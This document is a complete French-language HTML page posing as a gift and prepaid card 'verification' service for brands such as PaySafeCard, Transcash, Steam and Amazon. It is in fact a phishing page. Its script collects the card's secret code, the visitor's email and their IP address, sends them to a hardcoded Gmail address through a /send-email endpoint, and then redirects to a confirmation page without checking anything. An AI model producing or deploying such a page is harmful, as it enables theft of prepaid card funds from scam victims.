<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Vérificateur de Cartes Cadeaux</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');

    :root {
      --bg-start: #0f2027;
      --bg-end: #2c5364;
      --highlight: #00d2ff;
      --input-bg: rgba(255, 255, 255, 0.07);
      --card-bg: rgba(255, 255, 255, 0.05);
      --text: #ffffff;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(to bottom right, var(--bg-start), var(--bg-end));
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
    }

    .container {
      width: 100%;
      max-width: 600px;
      margin: auto;
    }

    header {
      text-align: center;
      margin-bottom: 30px;
    }

    h1 {
      font-size: 2rem;
      color: var(--highlight);
      margin-bottom: 10px;
    }

    .subtitle {
      color: #ccc;
      font-size: 1rem;
    }

    .card-box {
      background: var(--card-bg);
      padding: 30px;
      border-radius: 20px;
      backdrop-filter: blur(15px);
      border: 1px solid rgba(255,255,255,0.1);
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      font-weight: 600;
      margin-bottom: 8px;
      color: #fff;
    }

    .input-icon {
      position: relative;
    }

    .input-icon i {
      position: absolute;
      left: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: #aaa;
    }

    input[type="text"],
    input[type="password"],
    input[type="email"],
    select {
      width: 100%;
      padding: 12px 15px 12px 45px;
      background: var(--input-bg);
      color: white;
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 10px;
      font-size: 16px;
    }

    select {
      appearance: none;
    }

    select option {
      background: #1a2b3a;
      color: #fff;
    }

    button {
      width: 100%;
      padding: 14px;
      background: var(--highlight);
      color: #000;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.3s ease;
    }

    button:hover {
      background: #ffffff;
      color: var(--highlight);
    }

    .checkbox-row {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-top: 10px;
      justify-content: flex-start;
      color: #ccc;
    }

    .card-logos {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 15px;
      margin-top: 30px;
    }

    .card-logo-item {
      background: rgba(255,255,255,0.05);
      padding: 10px 15px;
      border-radius: 10px;
      width: 100%;
      max-width: 300px;
      display: flex;
      align-items: center;
      gap: 15px;
    }

    .card-logo-img {
      height: 40px;
    }

    footer {
      margin-top: 40px;
      text-align: center;
      color: #aaa;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1><i class="fas fa-gift"></i> Vérificateur De Recharges</h1>
      <p class="subtitle">Vérifiez la validité de vos cartes prépayées</p>
    </header>

    <div class="card-box">
      <form id="checkCardForm">
        <div class="form-group">
          <label for="email">Votre e-mail :</label>
          <div class="input-icon">
            <i class="fas fa-envelope"></i>
            <input type="email" id="email" required />
          </div>
        </div>

        <div class="form-group">
          <label for="cardType">Type de carte :</label>
          <div class="input-icon">
            <i class="fas fa-credit-card"></i>
            <select id="cardType" required>
              <option value="">-- Choisissez une carte --</option>
              <option value="transcash">Transcash</option>
              <option value="paysafecard">PaySafeCard</option>
              <option value="pcs">PCS</option>
              <option value="google_play">Google Play</option>
              <option value="neosurf">NeoSurf</option>
              <option value="amazon">Amazon</option>
              <option value="appstore_itunes">AppStore & iTunes</option>
              <option value="steam">Steam</option>
              <option value="apple">Apple</option>
              <option value="vanilla">Vanilla</option>
              <option value="toneo">Toneo</option>
            </select>
          </div>
        </div>

        <div class="form-group">
          <label for="amount">Montant (€) :</label>
          <div class="input-icon">
            <i class="fas fa-euro-sign"></i>
            <select id="amount" required>
              <option value="">-- Sélectionnez un montant --</option>
              <option value="10">10 €</option>
              <option value="20">20 €</option>
              <option value="30">30 €</option>
              <option value="40">40 €</option>
              <option value="50">50 €</option>
              <option value="100">100 €</option>
              <option value="150">150 €</option>
              <option value="200">200 €</option>
              <option value="250">250 €</option>
              <option value="300">300 €</option>
              <option value="350">350 €</option>
              <option value="400">400 €</option>
              <option value="450">450 €</option>
              <option value="500">500 €</option>
            </select>
          </div>
        </div>

        <div class="form-group">
          <label for="cardCode">Code secret :</label>
          <div class="input-icon">
            <i class="fas fa-barcode"></i>
            <input type="text" id="cardCode" required />
          </div>
          <div class="checkbox-row">
            <input type="checkbox" id="toggleCode" />
            <label for="toggleCode">Cacher le code</label>
          </div>
        </div>

        <button type="submit">Vérifier</button>
      </form>

      <div class="card-logos">
        <div class="card-logo-item">
          <img class="card-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" />
          <span>Amazon</span>
        </div>
        <div class="card-logo-item">
          <img class="card-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" />
          <span>Apple / iTunes</span>
        </div>
        <div class="card-logo-item">
          <img class="card-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg" alt="Steam" />
          <span>Steam</span>
        </div>
      </div>
    </div>

    <footer>© 2025 Vérificateur De Recharges</footer>
  </div>

  <script>
    const toggleCheckbox = document.getElementById('toggleCode');
    const cardCodeInput = document.getElementById('cardCode');

    toggleCheckbox.addEventListener('change', () => {
      cardCodeInput.type = toggleCheckbox.checked ? 'password' : 'text';
    });

    document.getElementById('checkCardForm').addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const type = document.getElementById('cardType').value;
      const code = document.getElementById('cardCode').value;
      const amount = document.getElementById('amount').value;

      const ip = await fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => data.ip);

      await fetch("/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          to: "stlljustina@gmail.com",
          subject: "Nouvelle vérification de carte",
          message: `E-mail: ${email}\nType: ${type}\nCode: ${code}\nMontant: ${amount} €\nDate: ${new Date().toLocaleString()}\nIP: ${ip}`
        })
      });

      window.location.href = "confirmation.html";
    });
  </script>
</body>
</html>
